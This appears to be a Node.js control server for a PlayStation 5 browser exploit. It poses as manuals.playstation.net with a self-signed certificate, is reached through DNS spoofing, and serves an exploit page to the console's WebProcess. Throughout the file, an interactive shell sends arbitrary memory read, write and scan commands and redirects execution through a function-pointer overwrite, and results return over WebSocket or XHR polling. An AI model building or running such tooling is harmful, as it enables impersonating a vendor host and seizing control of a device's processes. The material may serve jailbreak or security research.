'use strict';
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');
const readline = require('readline');
const selfsigned = require('selfsigned');

const PORT = parseInt(process.env.PORT || '443', 10);
const HTTP_PORT = parseInt(process.env.HTTP_PORT || '0', 10);
const HOSTNAME = process.env.HOSTNAME || 'manuals.playstation.net';
const BEACON_LOG = path.join(__dirname, 'shell-beacons.log');
const CERT_DIR = path.join(__dirname, '.certs');

const beaconStream = fs.createWriteStream(BEACON_LOG, { flags: 'a' });
function logBeacon(tag) {
  const line = `[${new Date().toISOString()}] ${tag}`;
  beaconStream.write(line + '\n');
  if (tag.includes('CONNECTED') || tag.includes('READY') || tag.includes('GATE') ||
      tag.includes('REALBODY') || tag.includes('LEAK') || tag.includes('ERR') ||
      tag.includes('DONE') || tag.includes('FAIL') || tag.includes('NOFACES') ||
      tag.includes('PIPELINE'))
    console.log(`  \x1b[90m${tag}\x1b[0m`);
}

function generateCert() {
  const certPath = path.join(CERT_DIR, 'cert.pem');
  const keyPath = path.join(CERT_DIR, 'key.pem');
  if (!fs.existsSync(CERT_DIR)) fs.mkdirSync(CERT_DIR, { recursive: true });
  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
    console.log('  Using existing cert in .certs/');
    return { cert: fs.readFileSync(certPath), key: fs.readFileSync(keyPath) };
  }
  console.log(`  Generating self-signed cert for ${HOSTNAME}...`);
  const attrs = [{ name: 'commonName', value: HOSTNAME }];
  const pems = selfsigned.generate(attrs, {
    algorithm: 'sha256',
    days: 365,
    keySize: 2048,
    extensions: [{ name: 'subjectAltName', altNames: [{ type: 2, value: HOSTNAME }] }],
  });
  fs.writeFileSync(certPath, pems.cert);
  fs.writeFileSync(keyPath, pems.private);
  console.log('  Cert generated OK');
  return { cert: pems.cert, key: pems.private };
}

function requestHandler(req, res) {
  /* SHELL XHR FALLBACK: the guide webview's secure WebSocket fails at
   * transport level (close code 1006, V-session 14:58) while XHR to the
   * same origin works flawlessly (every beacon proves it). The command
   * loop rides the same rails: GET /nextcmd -> execute -> POST /shellresult. */
  if (req.method === 'GET' && req.url.startsWith('/nextcmd')) {
    if (!pollModeSeen) { pollModeSeen = true; console.log('\n\x1b[32m*** PS5 WebProcess connected (XHR POLL MODE) ***\x1b[0m'); }
    let body = '{"wait":1}';
    if (cmdQueue.length > 0) body = JSON.stringify(cmdQueue.shift());
    res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' });
    res.end(body);
    return;
  }
  if (req.method === 'POST' && req.url.startsWith('/shellresult')) {
    let data = '';
    req.on('data', (c) => { data += c; });
    req.on('end', () => {
      logBeacon('[RES] ' + data.substring(0, 4000));
      let msg; try { msg = JSON.parse(data); } catch (e) { msg = null; }
      if (msg && msg.type === 'ready') {
        console.log('\n\x1b[1;32m*** PRIMITIVES READY (poll mode) ***\x1b[0m');
        console.log('  BASE:       ' + msg.base);
        console.log('  View:       ' + msg.view + ' (' + msg.viewSize + ' bytes)');
        console.log('  Cell:       ' + msg.cell);
        console.log('  PC Control: ' + (msg.pcControl ? '\x1b[32mYES\x1b[0m' : '\x1b[33mNO\x1b[0m'));
        if (msg.jf) console.log('  JSFunction: ' + msg.jf);
        if (msg.vm) console.log('  VM:         ' + msg.vm);
        if (msg.cfr) console.log('  cfr:        ' + msg.cfr);
        if (msg.jfuTop) console.log('  jfuTop:     ' + msg.jfuTop);
        console.log('\n  Type \x1b[1mhelp\x1b[0m for commands.\n');
        startCLI();
        res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok');
        return;
      }
      if (msg && msg.type === 'result' && pendingResolve) {
        clearTimeout(pendingTimeout);
        pendingResolve(msg); pendingResolve = null; pendingTimeout = null;
      }
      res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok');
    });
    return;
  }
  if (req.method === 'POST' && req.url.startsWith('/beacon/')) {
    const tag = decodeURIComponent(req.url.split('/beacon/')[1]?.split('?')[0] || '');
    logBeacon(tag);
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
    res.end('ok');
    return;
  }

  const serveDir = __dirname;
  let filePath;
  if (req.url === '/' || req.url === '/index.html') {
    filePath = path.join(serveDir, 'shell.html');
  } else {
    const safePath = req.url.split('?')[0].replace(/\.\./g, '');
    filePath = path.join(serveDir, safePath);
  }

  if (!fs.existsSync(filePath)) {
    res.writeHead(404);
    res.end('not found');
    return;
  }

  const ext = path.extname(filePath).toLowerCase();
  const types = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png' };
  res.writeHead(200, {
    'Content-Type': (types[ext] || 'application/octet-stream') + '; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Cache-Control': 'no-cache, no-store'
  });
  fs.createReadStream(filePath).pipe(res);
}

let activeWs = null;
let cmdQueue = [];
let pollModeSeen = false;
let cmdId = 0;
let pendingResolve = null;
let pendingTimeout = null;

function setupWss(server) {
  const wss = new WebSocket.Server({ server });
  wss.on('connection', (ws) => {
    if (activeWs) { try { activeWs.close(); } catch(e) {} }
    activeWs = ws;
    console.log('\n\x1b[32m*** PS5 WebProcess connected ***\x1b[0m');

    ws.on('message', (raw) => {
      let msg;
      try { msg = JSON.parse(raw); } catch(e) { return; }

      if (msg.type === 'status') {
        logBeacon('[WS] ' + msg.msg);
      } else if (msg.type === 'ready') {
        logBeacon('[READY] ' + JSON.stringify(msg));
        console.log('\x1b[1;32m*** PRIMITIVES READY ***\x1b[0m');
        console.log(`  BASE:       ${msg.base}`);
        console.log(`  View:       ${msg.view} (${msg.viewSize} bytes)`);
        console.log(`  Cell:       ${msg.cell}`);
        console.log(`  PC Control: ${msg.pcControl ? '\x1b[32mYES\x1b[0m' : '\x1b[33mNO\x1b[0m'}`);
        if (msg.jf) console.log(`  JSFunction: ${msg.jf}`);
        if (msg.vm) console.log(`  VM:         ${msg.vm}`);
        console.log(`\n  Type \x1b[1mhelp\x1b[0m for commands.\n`);
        startCLI();
      } else if (msg.type === 'result') {
        logBeacon('[RES] ' + JSON.stringify(msg).substring(0, 4000));
        if (pendingResolve) {
          clearTimeout(pendingTimeout);
          pendingResolve(msg);
          pendingResolve = null;
          pendingTimeout = null;
        }
      }
    });

    ws.on('close', () => {
      console.log('\n\x1b[31m*** Connection closed ***\x1b[0m');
      activeWs = null;
      if (pendingResolve) { pendingResolve({ err: 'connection closed' }); pendingResolve = null; }
    });

    ws.on('error', (e) => {
      console.log('\x1b[31mWS error:\x1b[0m', e.message);
    });
  });
}

function sendCmd(obj, timeoutMs) {
  timeoutMs = timeoutMs || 30000;
  return new Promise((resolve) => {
    obj.id = ++cmdId;
    logBeacon('[CMD] ' + JSON.stringify(obj));
    pendingResolve = resolve;
    pendingTimeout = setTimeout(() => {
      if (pendingResolve) { pendingResolve({ err: 'timeout' }); pendingResolve = null; }
    }, timeoutMs);
    if (activeWs && activeWs.readyState === WebSocket.OPEN) {
      activeWs.send(JSON.stringify(obj));
    } else {
      cmdQueue.push(obj);   /* XHR poll mode - the page picks it up on its next /nextcmd poll */
    }
  });
}

function hexDump(result) {
  if (!result || result.err) { console.log(result ? result.err : 'No response'); return; }
  if (!result.data || !result.data.length) { console.log('Empty'); return; }
  const base = BigInt(result.addr);
  for (let i = 0; i < result.data.length; i++) {
    const addr = (base + BigInt(i * 8)).toString(16).padStart(12, '0');
    console.log(`  0x${addr}: ${result.data[i]}`);
  }
}

function printChain(result) {
  if (!result || result.err) { console.log(result ? result.err : 'No response'); return; }
  if (!result.chain) { console.log('No data'); return; }
  for (const c of result.chain) {
    const indent = '  '.repeat(c.depth + 1);
    const note = c.note ? ` \x1b[33m${c.note}\x1b[0m` : '';
    console.log(`${indent}+0x${c.offset.toString(16).padStart(2,'0')}: ${c.value}${note}`);
  }
}

let cliStarted = false;
function startCLI() {
  if (cliStarted) return;
  cliStarted = true;
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

  function prompt() {
    rl.question('\x1b[1mps5>\x1b[0m ', async (line) => {
      line = line.trim();
      if (!line) { prompt(); return; }
      const parts = line.split(/\s+/);
      const cmd = parts[0].toLowerCase();

      try {
        switch (cmd) {
          case 'help': case 'h':
            console.log(`
  \x1b[1mMemory\x1b[0m
    read  <addr> [len]           Read qwords (default 0x80 bytes)
    write <addr> <value>         Write 8-byte value
    dump  <addr> [len]           Hex dump (default 0x100 bytes)
    str   <addr>                 Read StringImpl at address

  \x1b[1mSearch\x1b[0m
    scan  <start> <len> elf      Scan for ELF headers (page-aligned)
    scan  <start> <len> <hex>    Scan for specific qword value
    deref <addr> [depth]         Pointer chase (default depth 2)

  \x1b[1mExploration\x1b[0m
    auxv                         Decode AUXV from the stack top
    modules                      Scan foreign pointers for module bases
    threads                      Walk Thread structures for foreign ptrs

  \x1b[1mExecution\x1b[0m
    call  <addr>                 Redirect PC via NE m_function overwrite
    callret <addr>               call with fake scope (RDI controlled)

  \x1b[1mInfo\x1b[0m
    info                         Show primitive state
    status                       Connection status

  \x1b[1mMisc\x1b[0m
    raw   <json>                 Send raw JSON command
    q / quit                     Exit server
`);
            break;

          case 'read': case 'r': {
            const r = await sendCmd({ cmd: 'read', addr: parts[1], len: parts[2] || '0x80' });
            hexDump(r);
            break;
          }
          case 'write': case 'w': {
            const r = await sendCmd({ cmd: 'write', addr: parts[1], value: parts[2] });
            if (r) console.log(r.ok ? '\x1b[32mOK\x1b[0m' : '\x1b[31m' + (r.err || 'FAIL') + '\x1b[0m');
            break;
          }
          case 'dump': case 'd': {
            const r = await sendCmd({ cmd: 'dump', addr: parts[1], len: parts[2] || '0x100' });
            hexDump(r);
            break;
          }
          case 'str': {
            const r = await sendCmd({ cmd: 'str', addr: parts[1] });
            if (r) console.log(r.value || r.err);
            break;
          }
          case 'scan': case 's': {
            const r = await sendCmd({ cmd: 'scan', start: parts[1], len: parts[2], pattern: parts[3] || 'elf' }, 120000);
            if (r && r.hits && r.hits.length) r.hits.forEach(h => console.log(`  \x1b[32m${h.addr}\x1b[0m: ${h.desc}`));
            else console.log(r && r.err ? r.err : 'No hits');
            break;
          }
          case 'deref': {
            const r = await sendCmd({ cmd: 'deref', addr: parts[1], depth: parts[2] || '2' }, 60000);
            printChain(r);
            break;
          }
          case 'auxv': {
            const r = await sendCmd({ cmd: 'auxv' }, 60000);
            if (r && r.entries) r.entries.forEach(e => console.log(`  AT_${e.name.padEnd(12)} = ${e.value}`));
            else console.log(r && r.err ? r.err : 'No AUXV found');
            break;
          }
          case 'modules': {
            const r = await sendCmd({ cmd: 'modules' }, 120000);
            if (r && r.modules && r.modules.length) r.modules.forEach(m => console.log(`  \x1b[32m${m.base}\x1b[0m  ${m.name || ''}`));
            else console.log(r && r.err ? r.err : 'No modules found');
            break;
          }
          case 'threads': {
            const r = await sendCmd({ cmd: 'threads' }, 60000);
            if (r && r.threads) r.threads.forEach(t => console.log(`  ${t.addr}: ${JSON.stringify(t.ptrs)}`));
            else console.log(r && r.err ? r.err : 'No threads');
            break;
          }
          case 'call': {
            const r = await sendCmd({ cmd: 'call', addr: parts[1] });
            if (r) console.log(r.value !== undefined ? 'Returned: ' + r.value : r.err);
            break;
          }
          case 'callret': {
            const r = await sendCmd({ cmd: 'callret', addr: parts[1] });
            if (r) console.log(r.value !== undefined ? 'Returned: ' + r.value : r.err);
            break;
          }
          case 'info': {
            const r = await sendCmd({ cmd: 'info' });
            if (r) {
              console.log(`  BASE:       ${r.base || 'N/A'}`);
              console.log(`  View:       ${r.view || 'N/A'} (${r.viewSize || '?'} bytes)`);
              console.log(`  Cell:       ${r.cell || 'N/A'}`);
              console.log(`  PC Control: ${r.pcControl ? '\x1b[32mYES\x1b[0m' : '\x1b[33mNO\x1b[0m'}`);
              console.log(`  JSFunction: ${r.jf || 'N/A'}`);
              console.log(`  VM:         ${r.vm || 'N/A'}`);
              console.log(`  lowB:       ${r.lowB || 'N/A'}`);
              console.log(`  cfr:        ${r.cfr || 'N/A'}`);
            }
            break;
          }
          case 'status': {
            console.log(`  Connected: ${activeWs && activeWs.readyState === WebSocket.OPEN ? '\x1b[32mYES\x1b[0m' : '\x1b[31mNO\x1b[0m'}`);
            console.log(`  Commands sent: ${cmdId}`);
            break;
          }
          case 'raw': {
            try {
              const obj = JSON.parse(parts.slice(1).join(' '));
              const r = await sendCmd(obj, 60000);
              console.log(JSON.stringify(r, null, 2));
            } catch(e) { console.log('Invalid JSON'); }
            break;
          }
          case 'q': case 'quit': case 'exit':
            rl.close();
            process.exit(0);

          default:
            console.log(`Unknown command: ${cmd}. Type 'help'.`);
        }
      } catch (e) {
        console.log('\x1b[31mError:\x1b[0m', e.message);
      }
      prompt();
    });
  }
  prompt();
}

/* ---- Start server(s) ---- */
console.log(`\x1b[1mPS5 WebProcess Shell Server\x1b[0m`);
console.log(`  Beacons: ${BEACON_LOG}\n`);

const creds = generateCert();

if (creds) {
  const httpsServer = https.createServer({
    cert: creds.cert,
    key: creds.key,
    rejectUnauthorized: false,
  }, requestHandler);
  setupWss(httpsServer);
  httpsServer.listen(PORT, '0.0.0.0', () => {
    console.log(`\n  \x1b[32mHTTPS + WSS on port ${PORT}\x1b[0m`);
    console.log(`  The PS5 will connect here via DNS spoof.`);
    console.log(`\nWaiting for PS5 connection...\n`);
  });
  httpsServer.on('error', (e) => {
    if (e.code === 'EACCES') {
      console.log(`\x1b[31m  Port ${PORT} requires admin. Run as Administrator or set PORT=8443\x1b[0m`);
    } else {
      console.log(`\x1b[31m  Server error: ${e.message}\x1b[0m`);
    }
  });
}

if (HTTP_PORT > 0) {
  const httpServer = http.createServer(requestHandler);
  setupWss(httpServer);
  httpServer.listen(HTTP_PORT, '0.0.0.0', () => {
    console.log(`  \x1b[33mHTTP + WS on port ${HTTP_PORT}\x1b[0m (fallback / desktop testing)`);
  });
}
